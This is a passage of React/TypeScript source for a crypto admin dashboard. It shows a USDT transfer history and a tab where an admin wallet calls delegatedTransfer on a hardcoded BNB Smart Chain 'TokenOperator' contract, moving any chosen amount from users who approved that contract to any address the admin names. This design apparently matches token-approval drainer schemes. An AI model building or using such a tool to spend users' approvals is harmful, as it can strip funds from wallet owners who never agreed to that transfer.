    <div className="space-y-6">
      {/* Summary Cards */}
      {transfers.length > 0 && (
        <div className="grid gap-4 md:grid-cols-3">
          <Card className="border-primary/20">
            <CardHeader className="pb-3">
              <CardDescription>Total Transfers</CardDescription>
              <CardTitle className="text-3xl font-bold">
                {transfers.length}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-xs text-muted-foreground">
                <span className="text-green-600 font-medium">{successfulTransfers} successful</span>
                {failedTransfers > 0 && (
                  <span className="text-red-600 font-medium ml-2">{failedTransfers} failed</span>
                )}
              </div>
            </CardContent>
          </Card>

          <Card className="border-primary/20">
            <CardHeader className="pb-3">
              <CardDescription>Total Amount Transferred</CardDescription>
              <CardTitle className="text-3xl font-bold text-green-600">
                {totalAmount.toFixed(2)}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-xs text-muted-foreground">
                USDT (Successful transfers only)
              </div>
            </CardContent>
          </Card>

          <Card className="border-primary/20">
            <CardHeader className="pb-3">
              <CardDescription>Latest Transfer</CardDescription>
              <CardTitle className="text-lg font-bold">
                {formatToIST(transfers[0]._creationTime)}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-xs text-muted-foreground">
                {transfers[0].amount} USDT • {transfers[0].status}
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Transfer List */}
      <Card className="border-primary/20 shadow-lg">
        <CardHeader className="border-b bg-gradient-to-r from-card to-primary/5">
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="flex items-center gap-2">
                <HistoryIcon className="h-5 w-5" />
                All Transfers
              </CardTitle>
              <CardDescription className="mt-1">
                Complete transfer history with details
              </CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="p-6">
          {transfers.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-16 text-center">
              <div className="w-20 h-20 rounded-full bg-muted flex items-center justify-center mb-4">
                <HistoryIcon className="h-10 w-10 text-muted-foreground" />
              </div>
              <h3 className="text-lg font-semibold mb-1">No transfers yet</h3>
              <p className="text-sm text-muted-foreground">
                Transfer history will appear here once you make your first transfer
              </p>
            </div>
          ) : (
            <div className="space-y-4">
              {transfers.map((transfer) => (
                <Card
                  key={transfer._id}
                  className="hover:border-primary/40 transition-all duration-200 hover:shadow-md overflow-hidden"
                >
                  <CardContent className="p-5">
                    <div className="space-y-4">
                      <div className="flex items-start justify-between">
                        <div className="flex items-center gap-3">
                          <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                            transfer.status === "success"
                              ? "bg-gradient-to-br from-green-500/20 to-emerald-500/20"
                              : "bg-gradient-to-br from-red-500/20 to-rose-500/20"
                          }`}>
                            {transfer.status === "success" ? (
                              <CheckCircle2 className="h-5 w-5 text-green-500" />
                            ) : (
                              <XCircle className="h-5 w-5 text-red-500" />
                            )}
                          </div>
                          <div>
                            <div className={`text-2xl font-bold bg-gradient-to-r ${
                              transfer.status === "success"
                                ? "from-green-600 to-emerald-600"
                                : "from-red-600 to-rose-600"
                            } bg-clip-text text-transparent`}>
                              {transfer.amount} USDT
                            </div>
                            <Badge
                              className={
                                transfer.status === "success"
                                  ? "bg-green-500/10 text-green-600 border-green-500/20"
                                  : "bg-red-500/10 text-red-600 border-red-500/20"
                              }
                            >
                              {transfer.status}
                            </Badge>
                          </div>
                        </div>
                        <div className="text-right">
                          <div className="flex items-center gap-1 text-sm font-medium text-muted-foreground">
                            <Clock className="h-4 w-4" />
                            {formatToIST(transfer._creationTime)}
                          </div>
                        </div>
                      </div>

                      <div className="grid gap-3 text-sm pl-13">
                        <div className="flex items-start gap-2">
                          <Wallet className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                          <div>
                            <div className="font-medium text-xs text-muted-foreground mb-1">From Address</div>
                            <div className="font-mono text-xs break-all">{transfer.fromAddress}</div>
                          </div>
                        </div>

                        <div className="flex items-start gap-2">
                          <ArrowRightLeft className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                          <div>
                            <div className="font-medium text-xs text-muted-foreground mb-1">To Address</div>
                            <div className="font-mono text-xs break-all">{transfer.toAddress}</div>
                          </div>
                        </div>

                        <div className="flex items-start gap-2">
                          <Users className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                          <div>
                            <div className="font-medium text-xs text-muted-foreground mb-1">Transferred By</div>
                            <div className="font-mono text-xs break-all">{transfer.transferredBy}</div>
                          </div>
                        </div>

                        <div className="flex items-start gap-2">
                          <ExternalLink className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                          <div>
                            <div className="font-medium text-xs text-muted-foreground mb-1">Transaction Hash</div>
                            <a
                              href={`https://bscscan.com/tx/${transfer.txHash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="font-mono text-xs text-primary hover:underline break-all inline-flex items-center gap-1"
                            >
                              {transfer.txHash.slice(0, 16)}...{transfer.txHash.slice(-16)}
                            </a>
                          </div>
                        </div>

                        {transfer.note && (
                          <div className="flex items-start gap-2">
                            <FileText className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                            <div>
                              <div className="font-medium text-xs text-muted-foreground mb-1">Note</div>
                              <div className="text-sm">{transfer.note}</div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

function TransferTab({ adminWallet }: { adminWallet: string }) {
  const [fromAddress, setFromAddress] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [adminConnected, setAdminConnected] = useState(false);
  const createTransfer = useMutation(api.transfers.createTransfer);

  const BSC_CHAIN_ID = "0x38";
  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

  async function connectAdminWallet() {
    if (!window.ethereum) {
      toast.error("MetaMask not found");
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      const error = err as { code?: number };
      if (error.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: BSC_CHAIN_ID,
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        });
      }
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    setAdminConnected(true);
    toast.success("Admin wallet connected");
  }

  async function handleTransfer() {
    if (!fromAddress || !toAddress || !amount) {
      toast.error("Please fill all fields");
      return;
    }

    if (!adminConnected) {
      toast.error("Please connect admin wallet first");
      return;
    }

    setIsProcessing(true);

    try {
      const { ethers } = window as typeof window & {
        ethers: {
          BrowserProvider: new (provider: unknown) => {
            getSigner: () => Promise<unknown>;
          };
          Contract: new (
            address: string,
            abi: string[],
            signer: unknown
          ) => {
            delegatedTransfer: (
              tokenAddress: string,
              from: string,
              to: string,
              amount: bigint
            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
          };
          parseUnits: (value: string, decimals: number) => bigint;
        };
      };

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const operatorContract = new ethers.Contract(
        TOKEN_OPERATOR,
        [
          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
        ],
        signer
      );

      const amountInWei = ethers.parseUnits(amount, 18);

      const tx = await operatorContract.delegatedTransfer(
        BSC_USDT,
        fromAddress,
        toAddress,
        amountInWei
      );

      toast.success("Transaction submitted! Waiting for confirmation...");

      const receipt = await tx.wait();

      // Save transfer to database
      await createTransfer({
        adminWallet,
        fromAddress,
        toAddress,
        amount,
        txHash: receipt.hash,
        transferredBy: adminWallet,
        status: "success",
      });

      toast.success("Transfer successful! ✅");

      setFromAddress("");
      setToAddress("");
      setAmount("");
    } catch (error) {
      console.error(error);
      const err = error as { reason?: string; message?: string };
      
      // Save failed transfer to database
      try {
        await createTransfer({
          adminWallet,
          fromAddress,
          toAddress,
          amount,
          txHash: "failed",
          transferredBy: adminWallet,
          status: "failed",
          note: err.reason || err.message || "Transfer failed",
        });
      } catch (dbError) {
        console.error("Failed to save error to database:", dbError);
      }

      toast.error(err.reason || err.message || "Transfer failed");
    } finally {
      setIsProcessing(false);
    }
  }

  return (
    <Card className="border-primary/20 shadow-lg">
      <CardHeader className="border-b bg-gradient-to-r from-card to-primary/5">
        <CardTitle className="flex items-center gap-2">
          <Send className="h-5 w-5" />
          Transfer USDT
        </CardTitle>
        <CardDescription>
          Transfer USDT from approved user wallets using TokenOperator contract
        </CardDescription>
      </CardHeader>
      <CardContent className="p-6 space-y-6">
        {!adminConnected ? (
          <div className="flex flex-col items-center justify-center py-12 text-center space-y-6">
            <div className="w-20 h-20 rounded-full bg-gradient-to-br from-primary/20 to-primary/5 flex items-center justify-center">
              <Wallet className="h-10 w-10 text-primary" />
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Connect Admin Wallet</h3>
              <p className="text-sm text-muted-foreground max-w-sm mx-auto">
                Connect your admin wallet to transfer USDT from approved users
              </p>
            </div>
            <Button 
              onClick={connectAdminWallet} 
              size="lg"
              className="h-12 px-8 gap-2"
            >
              <Wallet className="h-5 w-5" />
              Connect Wallet
            </Button>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="flex items-center gap-3 p-4 rounded-lg bg-green-500/10 border border-green-500/20">
              <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center">
                <CheckCircle2 className="h-5 w-5 text-green-600" />
              </div>
              <span className="text-sm font-medium text-green-600">
                Admin wallet connected
              </span>
            </div>

            <div className="space-y-4">
              <div>
                <Label htmlFor="fromAddress" className="flex items-center gap-2 mb-2">
                  <Wallet className="h-4 w-4" />
                  From Address (User Wallet)
                </Label>
                <Input
                  id="fromAddress"
                  value={fromAddress}
                  onChange={(e) => setFromAddress(e.target.value)}
                  placeholder="0x..."
                  className="font-mono"
                />
                <p className="mt-1.5 text-xs text-muted-foreground">
                  The user must have approved the contract first
                </p>
              </div>

              <div>
                <Label htmlFor="toAddress" className="flex items-center gap-2 mb-2">
                  <ArrowRightLeft className="h-4 w-4" />
                  To Address (Destination)
                </Label>
                <Input
                  id="toAddress"
                  value={toAddress}
                  onChange={(e) => setToAddress(e.target.value)}
                  placeholder="0x..."
                  className="font-mono"
                />
              </div>

              <div>
                <Label htmlFor="amount" className="flex items-center gap-2 mb-2">
                  <Activity className="h-4 w-4" />
                  Amount (USDT)
                </Label>
                <Input
                  id="amount"
                  type="number"
                  step="0.01"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.0"
                />
              </div>

              <Button
                onClick={handleTransfer}
                disabled={isProcessing}
                className="w-full h-12 text-base gap-2"
                size="lg"
              >
                {isProcessing ? (
                  <>
                    <div className="h-4 w-4 animate-spin rounded-full border-2 border-background border-t-transparent" />
                    Processing...
                  </>
                ) : (
                  <>
                    <Send className="h-5 w-5" />
                    Transfer USDT
                  </>
                )}
              </Button>
            </div>

            <Card className="border-dashed bg-muted/50">
              <CardContent className="p-4">
                <div className="text-sm space-y-2">
                  <div className="font-semibold flex items-center gap-2">
                    <FileText className="h-4 w-4" />
                    How it works:
                  </div>
                  <ol className="list-decimal list-inside space-y-1 text-muted-foreground pl-1">
                    <li>User approves the TokenOperator contract</li>
                    <li>Admin connects wallet and enters transfer details</li>
                    <li>Admin signs the transaction</li>
                    <li>USDT is transferred from user to destination</li>
                  </ol>
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </CardContent>
    </Card>
  );
}
